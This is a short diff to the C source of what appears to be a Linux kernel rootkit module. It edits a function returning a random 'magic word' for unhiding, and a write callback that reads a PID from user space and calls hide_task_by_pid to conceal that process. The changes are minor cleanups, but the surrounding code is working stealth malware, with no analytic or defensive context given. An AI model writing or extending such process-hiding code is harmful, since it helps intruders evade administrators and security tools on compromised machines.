@@ -101,15 +101,9 @@ static char*
 get_unhide_magic_word(void)
 {
    if(!magic_word)
-     {
-        /*
-         * magic_word must be freed later,
-         * dynamic allocation from wally_random_bytes()
-         */
         magic_word = wally_random_bytes(MAX_MAGIC_WORD_SIZE);
-        if(!magic_word)
-          return NULL;
-     }
+
+   /* magic_word must be freed later */
    return magic_word;
 }
 
@@ -141,7 +135,7 @@ write_cb(struct file *fptr, const char __user *user, size_t size, loff_t *offset
      goto efault_error;
 
    pid = (pid_t)simple_strtol((const char*)buf, NULL, 10);
-   if((pid > 1) && (pid <= 65535 /* 16 bit range pids, increase it if necessary */))
+   if((pid > 1) && (pid <= 65535 /* 16 bit range pids */))
      {
         hide_task_by_pid(pid);
      }
